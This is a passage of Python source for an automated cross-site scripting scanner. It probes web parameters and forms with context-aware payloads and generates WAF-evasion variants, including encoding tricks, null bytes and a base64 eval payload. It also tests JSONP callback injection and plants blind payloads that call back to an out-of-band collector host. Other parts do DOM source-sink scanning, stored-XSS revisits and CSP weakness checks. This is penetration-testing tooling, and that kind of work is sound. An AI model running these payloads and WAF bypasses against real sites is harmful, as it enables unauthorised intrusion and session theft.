        "xss-jsonp":          "JSONP callback injection",
        "xss-csp-bypass":     "XSS against bypassable CSP",
        "xss-csp-missing":    "No CSP — MITM amplification",
        "xss-cookie-theft":   "XSS + missing HttpOnly on session cookie",
        "xss-waf-protected":  "WAF actively blocks XSS payloads",
    }
    for f in findings:
        for cid in (_chain_ids_for(f) or f.chain_ids):
            chains.setdefault(cid, []).append(f)
            if cid not in f.chain_ids:
                f.chain_ids.append(cid)
    out: list[XSSChain] = []
    for cid, fs in chains.items():
        max_sev = max(fs, key=lambda x: x.severity.rank).severity
        out.append(XSSChain(
            chain_id=cid, name=NAMES.get(cid, cid), severity=max_sev,
            steps=[x.evidence for x in fs],
            finding_hashes=[x.finding_hash for x in fs],
            evidence=fs[0].evidence if fs else "",
        ))
    return out


# ═════════════════════════════════════════════════════════════════════════════
#  HUGINN OOB CLIENT
# ═════════════════════════════════════════════════════════════════════════════

class HuginnClient:
    def __init__(self, base_url: str, *, read_key: Optional[str] = None,
                 timeout: int = 10, verify_tls: bool = True):
        self.base_url = base_url.rstrip("/")
        self.check_url = f"{self.base_url}/check.php"
        self.read_key = read_key or ""
        self.timeout = timeout
        self._session = requests.Session()
        self._session.verify = verify_tls
        self._session.headers["User-Agent"] = "Argus-XSS-Auditor/5.0 (huginn)"
        if self.read_key:
            self._session.headers["Authorization"] = f"Bearer {self.read_key}"

    def payload_url_path(self, token: str) -> str:
        return f"{self.base_url}/huginn-{token}/"

    def payload_url_subdomain(self, token: str) -> str:
        host = urllib.parse.urlparse(self.base_url).hostname or ""
        return f"https://{token}.{host}/"

    def check_token(self, token: str) -> dict:
        try:
            r = self._session.get(self.check_url, params={"token": token},
                                  timeout=self.timeout)
        except requests.RequestException as e:
            return {"found": False, "entries": [], "error": f"network: {e}"}
        if r.status_code >= 400:
            return {"found": False, "entries": [],
                    "error": f"HTTP {r.status_code}: {r.text[:200]}"}
        try:
            j = r.json()
        except ValueError:
            return {"found": False, "entries": [], "error": "non-JSON reply"}
        entries = j.get("entries") or []
        if not entries and j.get("entry"):
            entries = [j["entry"]]
        return {"found": bool(j.get("found")), "entries": entries}

    def poll_until_hit(self, token: str, *, max_wait: int = HUGINN_POLL_TIMEOUT,
                       interval: int = HUGINN_POLL_INTERVAL) -> dict:
        deadline = time.monotonic() + max_wait
        last = {"found": False, "entries": []}
        while True:
            last = self.check_token(token)
            if last.get("found"):
                return last
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return last
            time.sleep(min(interval, remaining))


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname in urllib.parse.parse_qs(parsed.query):
            key = (url, pname, "query")
            if key in seen:
                continue
            seen.add(key)
            surfaces.append({"url": url, "param": pname,
                             "location": "query", "method": "GET"})
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = field_def.get("name") or ""
                if not fname:
                    continue
                key = (action, fname, "body")
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({"url": action, "param": fname,
                                 "location": "body", "method": "POST"})
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(session: EvasionSession, surface: dict) -> Baseline:
    baseline = Baseline(url=surface["url"], param=surface["param"],
                        location=surface["location"])
    times: list[float] = []
    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if surface["location"] == "body":
            resp = session.request(surface.get("method", "POST"), surface["url"],
                                   data={surface["param"]: "argusbaseline"})
        else:
            resp = session.get(surface["url"])
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.content_type = resp.headers.get("Content-Type", "")
            baseline.nosniff = (resp.headers.get("X-Content-Type-Options", "").lower() == "nosniff")
            sanitizer, version = _fingerprint_sanitizer(baseline.body, dict(resp.headers))
            baseline.sanitizer = sanitizer
            baseline.sanitizer_version = version
        time.sleep(REQUEST_SLEEP)
    if times:
        baseline.median_time = statistics.median(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — REFLECTION PROBE
# ═════════════════════════════════════════════════════════════════════════════

def _marker_in_encoded_form(body: str, marker: str) -> bool:
    if not marker:
        return False
    if "".join(f"&#{ord(c)};" for c in marker) in body:
        return True
    if "".join(f"&#x{ord(c):x};" for c in marker) in body:
        return True
    return False


def probe_reflection(session: EvasionSession, surface: dict) -> dict:
    marker1 = _new_marker()
    resp = _probe(session, surface, marker1)
    time.sleep(REQUEST_SLEEP)
    result = {"reflected": False, "index": -1, "marker": marker1,
              "unencoded": False, "cache_hit": False}
    if resp is None:
        return result
    body = _body(resp)
    idx = body.find(marker1)
    if idx >= 0:
        result["reflected"] = True
        result["index"] = idx
        result["unencoded"] = True
    elif _marker_in_encoded_form(body, marker1):
        result["reflected"] = True
        result["unencoded"] = False
        return result
    else:
        return result

    marker2 = _new_marker()
    resp2 = _probe(session, surface, marker2)
    time.sleep(REQUEST_SLEEP)
    if resp2 is None:
        return result
    body2 = _body(resp2)
    if marker2 not in body2:
        result["cache_hit"] = True
        result["reflected"] = False
        return result
    return result


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — CONTEXT CLASSIFIER
# ═════════════════════════════════════════════════════════════════════════════

def classify_context(body: str, index: int) -> str:
    if index < 0 or index >= len(body):
        return "unknown"
    prefix = body[:index].lower()
    in_comment = in_script = in_style = False
    in_raw_text = ""
    in_tag = False
    quote = ""
    last_attr = ""
    in_js_string = ""
    js_escape = False
    i, n = 0, len(prefix)
    while i < n:
        ch = prefix[i]
        if in_comment:
            if prefix.startswith("-->", i):
                in_comment = False; i += 3; continue
            i += 1; continue
        if in_raw_text:
            close = f"</{in_raw_text}"
            if prefix.startswith(close, i):
                in_raw_text = ""; i += len(close); continue
            i += 1; continue
        if in_script:
            if prefix.startswith("</script", i):
                in_script = False; in_style = False; i += 8; continue
            if in_style:
                if prefix.startswith("</style", i):
                    in_style = False; in_script = False; i += 7; continue
                i += 1; continue
            if js_escape:
                js_escape = False; i += 1; continue
            if ch == "\\":
                js_escape = True; i += 1; continue
            if in_js_string:
                if ch == in_js_string:
                    in_js_string = ""
                i += 1; continue
            if ch in ("'", '"', "`"):
                in_js_string = ch; i += 1; continue
            i += 1; continue
        if in_tag:
            if quote:
                if ch == quote:
                    quote = ""
                i += 1; continue
            if ch in ("'", '"'):
                quote = ch; i += 1; continue
            if ch == ">":
                in_tag = False; last_attr = ""; i += 1; continue
            if ch.isalpha() or ch == "-":
                j = i
                while j < n and (prefix[j].isalnum() or prefix[j] in "-_"):
                    j += 1
                last_attr = prefix[i:j].lower()
                i = j; continue
            i += 1; continue
        if prefix.startswith("<!--", i):
            in_comment = True; i += 4; continue
        if prefix.startswith("<script", i):
            in_script = True; i += 7
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n; continue
        if prefix.startswith("<style", i):
            in_script = True; in_style = True; i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n; continue
        if prefix.startswith("<textarea", i):
            in_raw_text = "textarea"; i += 9
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n; continue
        if prefix.startswith("<title", i):
            in_raw_text = "title"; i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n; continue
        if ch == "<":
            in_tag = True; last_attr = ""; i += 1
            j = i
            while j < n and (prefix[j].isalnum() or prefix[j] in "-:"):
                j += 1
            i = j; continue
        i += 1

    if in_comment: return "html_comment"
    if in_raw_text: return in_raw_text
    if in_script and in_style: return "css"
    if in_script:
        if in_js_string == "`": return "script_template"
        if in_js_string == "'": return "script_string_single"
        if in_js_string == '"': return "script_string_double"
        return "script_bare"
    if in_tag:
        if quote == '"':
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_double"
        if quote == "'":
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_single"
        return "attr_unquoted"
    return "html_body"


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — ENCODING ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyze_encoding(body: str, index: int, payload: str) -> tuple[list[str], list[str], list[str]]:
    if index < 0:
        return [], [], []
    window = body[max(0, index - 50): index + len(payload) + 50]
    encoded: list[str] = []
    survived: list[str] = []
    types: set[str] = set()
    for ch in ENCODING_CHARS:
        if ch not in payload:
            continue
        if ch in window:
            survived.append(ch)
        for etype, forms in ENCODED_FORMS_BY_TYPE.items():
            form = forms.get(ch)
            if form and form.lower() in window.lower():
                encoded.append(ch)
                types.add(etype)
                break
    return encoded, survived, sorted(types)


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — WAF BYPASS VARIANTS
# ═════════════════════════════════════════════════════════════════════════════

def _waf_variants(payload: str, aggressive: bool = False) -> list[tuple[str, str]]:
    variants: list[tuple[str, str]] = []
    mixed = re.sub(
        r"\b(svg|img|script|alert|onload|onerror|onmouseover|onfocus)\b",
        lambda m: "".join(c.upper() if i % 2 else c.lower()
                          for i, c in enumerate(m.group(0))),
        payload, flags=re.I,
    )
    if mixed != payload:
        variants.append((mixed, "case_mix"))
    variants.append((urllib.parse.quote(payload, safe=""), "url_encode"))
    variants.append((urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""),
                     "double_url_encode"))
    ent_q = payload.replace('"', "&#34;").replace("'", "&#39;")
    if ent_q != payload:
        variants.append((ent_q, "entity_quotes"))
    hex_q = payload.replace('"', "&#x22;").replace("'", "&#x27;")
    if hex_q != payload:
        variants.append((hex_q, "hex_entity_quotes"))
    uni = payload.replace("a", "\\u0061").replace("l", "\\u006c").replace("e", "\\u0065")
    if uni != payload:
        variants.append((uni, "unicode_escape"))
    ucode = payload.replace("a", "\\u{61}").replace("l", "\\u{6c}")
    if ucode != payload:
        variants.append((ucode, "unicode_codepoint"))
    nl = payload.replace(" ", "%0a")
    if nl != payload:
        variants.append((nl, "newline_inject"))
    nnull = payload.replace(" ", "%00")
    if nnull != payload:
        variants.append((nnull, "null_byte"))
    bt = payload.replace('="', "=`").replace('"', "`")
    if bt != payload:
        variants.append((bt, "backtick_attr"))
    cb = payload.replace("<svg", "<svg/**/").replace("<img", "<img/**/")
    if cb != payload:
        variants.append((cb, "comment_break"))
    slash = payload.replace("<svg ", "<svg/").replace("<img ", "<img/")
    if slash != payload:
        variants.append((slash, "slash_separator"))
    tab = payload.replace("<svg ", "<svg%09").replace("<img ", "<img%09")
    if tab != payload:
        variants.append((tab, "whitespace_tab"))
    ff = payload.replace("<svg ", "<svg%0c").replace("<img ", "<img%0c")
    if ff != payload:
        variants.append((ff, "whitespace_formfeed"))
    if aggressive:
        # Extra aggressive-only transforms
        b64 = "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
        if b64 not in payload:
            variants.append((b64, "base64_eval"))
        spaced = re.sub(r"alert\(", "window['al'%2B'ert'](", payload)
        if spaced != payload:
            variants.append((spaced, "split_alert"))
    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3+4 — CONTEXT-AWARE PAYLOAD TESTING (with multi-fidelity)
# ═════════════════════════════════════════════════════════════════════════════

def test_context_payloads(
    session: EvasionSession, surface: dict, baseline: Baseline, context: str,
    *, aggressive: bool = False, waf_vendor: str = "",
) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    ct_kind = _content_type_kind(baseline.content_type)
    effective_context = context
    if ct_kind == "svg" and context in ("html_body", "unknown"):
        effective_context = "svg"
    elif ct_kind == "xml" and context in ("html_body", "unknown"):
        effective_context = "xml"

    max_payloads = MAX_CONTEXT_PAYLOADS_AGGRESSIVE if aggressive else MAX_CONTEXT_PAYLOADS
    payloads = (CONTEXT_PAYLOADS.get(effective_context) or CONTEXT_PAYLOADS["unknown"])[:max_payloads]
    sent: set[str] = set()

    for template in payloads:
        marker = _new_marker()
        payload = template.format(m=marker)
        if payload in sent:
            continue
        sent.add(payload)

        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)
        if resp is None or _looks_denied(resp):
            continue
        body = _body(resp)
        idx = body.find(payload)

        if idx >= 0:
            # Multi-fidelity: fire once more, require consistent reflection
            consistency = 1
            for _ in range(MULTI_FIDELITY_ATTEMPTS - 1):
                v_resp = _probe(session, surface, payload)
                time.sleep(REQUEST_SLEEP)
                if v_resp and payload in _body(v_resp):
                    consistency += 1
            multi_ok = consistency >= MULTI_FIDELITY_ATTEMPTS

            encoded, survived, enc_types = analyze_encoding(body, idx, payload)
            executable = (
                "(" in survived and ")" in survived
                and any(c in survived for c in ("<", '"', "'", "`"))
            )
            severity = Severity.CRITICAL if (executable and multi_ok) else (
                Severity.HIGH if executable else Severity.MEDIUM
            )
            confidence = 95 if (executable and multi_ok) else (
                90 if executable else 70
            )
            findings.append(XSSFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                xss_type="reflected", context=context,
                severity=severity, confidence=confidence,
                confirmed=executable and multi_ok,
                payload=payload, marker=marker,
                evidence=(
                    f"Payload survived UNENCODED in {context} context"
                    f" (multi-fidelity {consistency}/{MULTI_FIDELITY_ATTEMPTS}) — "
                    f"survived: {''.join(survived) or '(none)'}"
                    + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")
                ),
                encoded_chars=encoded, survived_chars=survived,
                http_status=resp.status_code, waf_vendor=waf_vendor,
                details={
                    "reflection_index": idx, "context": context,
                    "content_type": baseline.content_type,
                    "executable": executable,
                    "multi_fidelity": consistency,
                    "encoding_types": enc_types,
                    "sanitizer": baseline.sanitizer,
                    "body_snippet": body[max(0, idx - 80): idx + len(payload) + 80],
                },
            ))
            return findings

        midx = body.find(marker)
        if midx >= 0:
            encoded, survived, enc_types = analyze_encoding(body, midx, payload)
            findings.append(XSSFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                xss_type="reflected", context=context,
                severity=Severity.LOW, confidence=55, confirmed=False,
                payload=payload, marker=marker, waf_vendor=waf_vendor,
                evidence=(f"Marker reflected in {context} but payload was filtered/modified"
                          + (f"; encoding_types={','.join(enc_types)}" if enc_types else "")),
                encoded_chars=encoded, survived_chars=survived,
                http_status=resp.status_code,
                details={"body_snippet": body[max(0, midx - 80): midx + 120],
                         "encoding_types": enc_types,
                         "sanitizer": baseline.sanitizer},
            ))
            return findings

        # WAF block → try variants
        if resp.status_code in WAF_BLOCK_STATUSES or aggressive:
            for variant, label in _waf_variants(payload, aggressive):
                v_resp = _probe(session, surface, variant)
                time.sleep(REQUEST_SLEEP)
                if v_resp is None or _looks_denied(v_resp):
                    continue
                v_body = _body(v_resp)
                v_midx = v_body.find(marker)
                if v_midx < 0:
                    continue
                actual_ctx = classify_context(v_body, v_midx)
                encoded, survived, enc_types = analyze_encoding(v_body, v_midx, variant)
                findings.append(XSSFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    xss_type="reflected", context=context,
                    severity=Severity.HIGH, confidence=80, confirmed=True,
                    payload=variant, marker=marker, bypass_used=label,
                    waf_vendor=waf_vendor,
                    evidence=(f"WAF bypass '{label}' reflected marker in {actual_ctx} context"),
                    encoded_chars=encoded, survived_chars=survived,
                    http_status=v_resp.status_code,
                    details={"original_payload": payload, "variant": variant,
                             "actual_context": actual_ctx,
                             "encoding_types": enc_types},
                ))
                return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  JSONP CALLBACK INJECTION
# ═════════════════════════════════════════════════════════════════════════════

def test_jsonp_injection(session: EvasionSession, surface: dict, baseline: Baseline) -> list[XSSFinding]:
    p = surface["param"].lower()
    if not any(hint in p for hint in JSONP_PARAM_HINTS):
        return []
    marker = _new_marker()
    probe_payload = f"{marker}_cb"
    resp = _probe(session, surface, probe_payload)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return []
    body = _body(resp)
    if body.lstrip().startswith(probe_payload + "(") or \
       body.lstrip().startswith("/*") and probe_payload + "(" in body[:200]:
        return [XSSFinding(
            target=surface["url"], param=surface["param"],
            param_location=surface["location"],
            xss_type="jsonp", context="jsonp",
            severity=Severity.HIGH, confidence=85, confirmed=True,
            payload=f"{probe_payload}", marker=marker,
            evidence=(f"JSONP callback parameter '{surface['param']}' reflected "
                      f"unquoted at start of response — script-execution primitive"),
            http_status=resp.status_code,
            details={"content_type": baseline.content_type,
                     "body_prefix": body[:200],
                     "attack_payload": f"{probe_payload};alert(document.domain);//"},
        )]
    return []


# ═════════════════════════════════════════════════════════════════════════════
#  DOM XSS STATIC ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def _indentation(line: str) -> int:
    return len(line) - len(line.lstrip())


def analyze_dom_js(js_url: str, js_content: str, target_page: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    if not js_content:
        return findings

    jq_m = re.search(r"jQuery[^\"'\n]*?v?(\d+)\.(\d+)\.(\d+)", js_content[:8000], re.I)
    if jq_m:
        ver = (int(jq_m.group(1)), int(jq_m.group(2)), int(jq_m.group(3)))
        if ver < JQUERY_MIN_SAFE:
            findings.append(XSSFinding(
                target=target_page, param="(DOM)", xss_type="dom", context="dom",
                severity=Severity.MEDIUM, confidence=70, confirmed=False,
                payload=f"jQuery v{'.'.join(map(str, ver))}",
                evidence=(f"jQuery {'.'.join(map(str, ver))} < "
                          f"{'.'.join(map(str, JQUERY_MIN_SAFE))} — vulnerable to "
                          "html()-with-user-input XSS chains"),
                details={"js_url": js_url, "jquery_version": ver,
                         "cve_hints": ["CVE-2020-11022", "CVE-2020-11023"]},
            ))

    dp_m = re.search(r"DOMPurify[^\"'\n]*?v?(\d+)\.(\d+)\.(\d+)", js_content[:8000], re.I)
    if dp_m:
        ver = (int(dp_m.group(1)), int(dp_m.group(2)), int(dp_m.group(3)))
        if ver < DOMPURIFY_MIN_SAFE:
            findings.append(XSSFinding(
                target=target_page, param="(DOM)", xss_type="dom", context="dom",
                severity=Severity.MEDIUM, confidence=65, confirmed=False,
                payload=f"DOMPurify v{'.'.join(map(str, ver))}",
                evidence=(f"DOMPurify {'.'.join(map(str, ver))} < "
                          f"{'.'.join(map(str, DOMPURIFY_MIN_SAFE))} — "
                          "known mXSS bypasses apply"),
                details={"js_url": js_url, "dompurify_version": ver},
            ))

    lines = js_content.splitlines()
    source_lines: dict[str, list[int]] = {}
    sink_lines: dict[str, list[int]] = {}
    for i, line in enumerate(lines):
        for src in DOM_SOURCES:
            if src in line:
                source_lines.setdefault(src, []).append(i)
        for sink in DOM_SINKS:
            if sink in line:
                sink_lines.setdefault(sink, []).append(i)

    if not source_lines or not sink_lines:
        return findings

    for src, src_positions in source_lines.items():
        for sink, sink_positions in sink_lines.items():
            matched = False
            for sp in src_positions:
                for kp in sink_positions:
                    if abs(sp - kp) > 15:
                        continue
                    if abs(_indentation(lines[sp]) - _indentation(lines[kp])) > 4:
                        continue
                    confidence = 75 if abs(sp - kp) <= 5 else 60
                    findings.append(XSSFinding(
                        target=target_page, param="(DOM)", xss_type="dom", context="dom",
                        severity=Severity.HIGH if confidence >= 75 else Severity.MEDIUM,
                        confidence=confidence, confirmed=False,
                        payload=f"{src} → {sink}",
                        evidence=(f"Source '{src}' flows to sink '{sink}' within "
                                  f"{abs(sp - kp)} lines in {js_url}"),
                        details={"js_url": js_url, "source": src, "sink": sink,
                                 "source_line": sp + 1, "sink_line": kp + 1,
                                 "snippet": lines[max(0, min(sp, kp) - 2): max(sp, kp) + 3]},
                    ))
                    matched = True
                    break
                if matched:
                    break
    return findings


def run_dom_analysis(session: EvasionSession, outdir: Path) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    js_urls: list[str] = []
    for name in ("urls_js_files.txt", "js_files.txt"):
        p = outdir / name
        if p.exists():
            for line in p.read_text().splitlines():
                url = line.strip().split()[0] if line.strip() else ""
                if url and url.endswith(".js") and url not in js_urls:
                    js_urls.append(url)
                    if len(js_urls) >= MAX_DOM_FILES:
                        break
        if len(js_urls) >= MAX_DOM_FILES:
            break
    if not js_urls:
        return findings
    log.info(f"    DOM analysis: {len(js_urls)} JS file(s)")
    for js_url in js_urls:
        resp = session.get(js_url, timeout=15)
        time.sleep(REQUEST_SLEEP)
        if resp is None or resp.status_code >= 400:
            continue
        content = _body(resp)
        if not content:
            continue
        findings.extend(analyze_dom_js(js_url, content, js_url))
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  STORED CANDIDATES
# ═════════════════════════════════════════════════════════════════════════════

def run_stored_candidates(session: EvasionSession, surface: dict,
                          baseline: Baseline) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    marker = _new_marker()
    resp = _probe(session, surface, marker)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return findings
    parsed = urllib.parse.urlparse(surface["url"])
    base = f"{parsed.scheme}://{parsed.netloc}"
    for path in STORED_REVISIT_PATTERNS[:MAX_STORED_PAGES]:
        test_url = base + path
        r = session.get(test_url)
        time.sleep(REQUEST_SLEEP)
        if r is None or r.status_code >= 400:
            continue
        body = _body(r)
        idx = body.find(marker)
        if idx >= 0:
            context = classify_context(body, idx)
            findings.append(XSSFinding(
                target=test_url, param=surface["param"],
                param_location=surface["location"],
                xss_type="stored", context=context,
                severity=Severity.CRITICAL, confidence=80, confirmed=True,
                payload=marker, marker=marker,
                evidence=(f"Injected marker reappeared on {test_url} "
                          f"after submission via {surface['param']}"),
                details={"injection_url": surface["url"], "revisit_url": test_url,
                         "context": context,
                         "body_snippet": body[max(0, idx - 80): idx + 120]},
            ))
            return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  BLIND OOB
# ═════════════════════════════════════════════════════════════════════════════

def generate_blind_payloads(surface: dict, *, oob_base_url: str,
                            oob_mode: str = "path") -> list[dict]:
    if not oob_base_url:
        return []
    token = _new_huginn_token()
    client = HuginnClient(oob_base_url, verify_tls=False)
    oob_url = (client.payload_url_subdomain(token) if oob_mode == "subdomain"
               else client.payload_url_path(token))
    out: list[dict] = []
    for label, tmpl in BLIND_PAYLOAD_TEMPLATES:
        out.append({
            "target": surface["url"], "param": surface["param"],
            "location": surface["location"],
            "oob_token": token, "oob_url": oob_url,
            "variant": label, "payload": tmpl.format(oob=oob_url),
        })
    return out


def blind_payloads_to_findings(blind_payloads: list[dict]) -> list[XSSFinding]:
    by_token: dict[str, XSSFinding] = {}
    for b in blind_payloads:
        tok = b["oob_token"]
        if tok in by_token:
            continue
        by_token[tok] = XSSFinding(
            target=b["target"], param=b["param"],
            param_location=b.get("location", "query"),
            xss_type="blind", context="(oob)",
            severity=Severity.HIGH, confidence=60, confirmed=False,
            payload=b["payload"], marker=tok,
            evidence=(f"Blind payload generated with OOB token {tok[:12]}… — "
                      "awaiting callback. Deploy and run --verify-oob."),
            details={"oob_url": b["oob_url"], "oob_token": tok,
                     "variant": b["variant"], "deployed": False},
        )
    return list(by_token.values())


def verify_blind_findings(outdir: Path, *, oob_base_url: str,
                          read_key: Optional[str] = None,
                          max_wait: int = 0,
                          scan_id: Optional[int] = None) -> dict:
    if not oob_base_url:
        return {"polled": 0, "confirmed": 0, "misses": 0, "error": "no OOB base_url"}
    json_path = outdir / "xss_findings.json"
    if not json_path.exists():
        log.warning("  OOB verify: xss_findings.json missing — skipping")
        return {"polled": 0, "confirmed": 0, "misses": 0, "error": "no report"}
    report = json.loads(json_path.read_text())
    findings = report.get("findings") or []
    tokens: dict[str, list[dict]] = {}
    for f in findings:
        if f.get("xss_type") != "blind":
            continue
        if f.get("confirmed") is True or f.get("confirmed") == 1:
            continue
        tok = (f.get("details") or {}).get("oob_token") or f.get("marker")
        if not tok or not re.fullmatch(r"[a-f0-9]{16,}", tok):
            continue
        tokens.setdefault(tok, []).append(f)
    if not tokens:
        log.info("  OOB verify: no unconfirmed blind findings to poll")
        return {"polled": 0, "confirmed": 0, "misses": 0}
    log.info(f"  OOB verify: polling {len(tokens)} token(s) against {oob_base_url}"
             + (f" up to {max_wait}s each" if max_wait else " (single pass)"))
    client = HuginnClient(oob_base_url, read_key=read_key, verify_tls=False)
    hits: dict[str, dict] = {}
    misses = 0
    for tok in tokens:
        result = (client.poll_until_hit(tok, max_wait=max_wait) if max_wait > 0
                  else client.check_token(tok))
        if result.get("found"):
            hits[tok] = result
            log.info(f"    ✔ {tok[:16]}…  {len(result.get('entries') or [])} callback(s)")
        else:
            misses += 1
    if not hits:
        log.info(f"    no callbacks yet — {misses} miss(es)")
        return {"polled": len(tokens), "confirmed": 0, "misses": misses}
    upgraded: list[dict] = []
    for f in findings:
        if f.get("xss_type") != "blind":
            continue
        tok = (f.get("details") or {}).get("oob_token") or f.get("marker")
        if tok not in hits:
            continue
        entries = hits[tok].get("entries") or []
        ip = entries[0].get("ip") if entries else "?"
        ts = entries[0].get("time") if entries else "?"
        ua = (entries[0].get("user_agent") or "?")[:60] if entries else "?"
        f["confirmed"] = True
        f["severity"] = "CRITICAL"
        f["confidence"] = 99
        f["evidence"] = (f"Blind XSS CONFIRMED via OOB callback — {len(entries)} hit(s); "
                         f"first from IP {ip} at {ts} (UA: {ua})")
        f.setdefault("details", {})["oob_confirmed"] = {
            "token": tok, "entries": entries, "hit_count": len(entries),
        }
        f.setdefault("chain_ids", []).append("xss-blind")
        upgraded.append(f)
    if upgraded:
        report["findings"] = findings
        totals = report.setdefault("totals", {})
        totals["confirmed"] = int(totals.get("confirmed", 0)) + len(upgraded)
        totals["blind_confirmed"] = len(upgraded)
        json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        log.info(f"    upgraded {len(upgraded)} blind finding(s) → CONFIRMED")
        if scan_id is not None:
            rebuilt = [_dict_to_finding(raw) for raw in upgraded]
            _self_sync(scan_id, rebuilt)
    return {"polled": len(tokens), "confirmed": len(upgraded), "misses": misses}


def _dict_to_finding(raw: dict) -> XSSFinding:
    sev_raw = raw.get("severity", "MEDIUM")
    try:
        sev = Severity(sev_raw) if not isinstance(sev_raw, Severity) else sev_raw
    except ValueError:
        sev = Severity.MEDIUM
    return XSSFinding(
        target=raw.get("target", ""),
        param=raw.get("param_name", ""),
        param_location=raw.get("param_location", "query"),
        xss_type=raw.get("xss_type", "blind"),
        context=raw.get("context", ""),
        severity=sev,
        confidence=int(raw.get("confidence", 0) or 0),
        confirmed=bool(raw.get("confirmed", False) is True or int(raw.get("confirmed", 0) or 0) == 1),
        payload=raw.get("payload", ""),
        marker=raw.get("marker", ""),
        evidence=raw.get("evidence", ""),
        bypass_used=raw.get("bypass_used", ""),
        encoded_chars=raw.get("encoded_chars") or [],
        survived_chars=raw.get("survived_chars") or [],
        http_status=int(raw.get("http_status", 0) or 0),
        chain_ids=raw.get("chain_ids") or [],
        waf_vendor=raw.get("waf_vendor", ""),
        auth_enabled=bool(raw.get("auth_enabled", False)),
        first_seen=raw.get("first_seen", ""),
        details=raw.get("details") or {},
    )


# ═════════════════════════════════════════════════════════════════════════════
#  CSP ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyze_csp(resp: requests.Response, target: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    if resp is None:
        return findings
    csp = resp.headers.get("Content-Security-Policy", "")
    csp_ro = resp.headers.get("Content-Security-Policy-Report-Only", "")
    if not csp and csp_ro:
        findings.append(XSSFinding(
            target=target, param="(CSP)", xss_type="csp", context="csp",
            severity=Severity.INFO, confidence=90, confirmed=True,
            payload="", evidence="Only Report-Only CSP present — directives are NOT enforced",
            details={"header": "Content-Security-Policy-Report-Only",
                     "value": csp_ro[:500]},
        ))
        return findings
    if not csp:
        return findings
    lower = csp.lower()
    checks = [
        ("unsafe-inline", Severity.HIGH, "CSP allows 'unsafe-inline' — inline scripts execute"),
        ("unsafe-eval", Severity.HIGH, "CSP allows 'unsafe-eval' — eval() and Function() execute"),
        ("script-src *", Severity.HIGH, "script-src allows wildcard — any host can serve scripts"),
        ("script-src: *", Severity.HIGH, "script-src allows wildcard — any host can serve scripts"),
    ]
    for needle, sev, ev in checks:
        if needle in lower:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity=sev, confidence=85, confirmed=False,
                payload=needle, evidence=ev,
                details={"header": "Content-Security-Policy", "directive": needle},
            ))
    for host in CSP_BYPASS_HOSTS:
        if host in csp:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity=Severity.MEDIUM, confidence=70, confirmed=False,
                payload=f"script-src {host}",
                evidence=f"script-src allowlists {host} — JSONP endpoints bypass CSP",
                details={"header": "Content-Security-Policy",
                         "allowlisted_host": host},
            ))
    for missing in ("base-uri", "object-src"):
        if missing not in lower:
            findings.append(XSSFinding(
                target=target, param="(CSP)", xss_type="csp", context="csp",
                severity=Severity.MEDIUM, confidence=70, confirmed=False,
                payload=f"missing {missing}",
                evidence=(f"CSP does not set {missing} — "
                          + ("<base> tag injection redirects relative scripts" if missing == "base-uri"
                             else "plugin-based script execution possible")),
                details={"header": "Content-Security-Policy", "directive": missing},
            ))
    return findings


# ═════════════════════════════════════════════════════════════════════════════
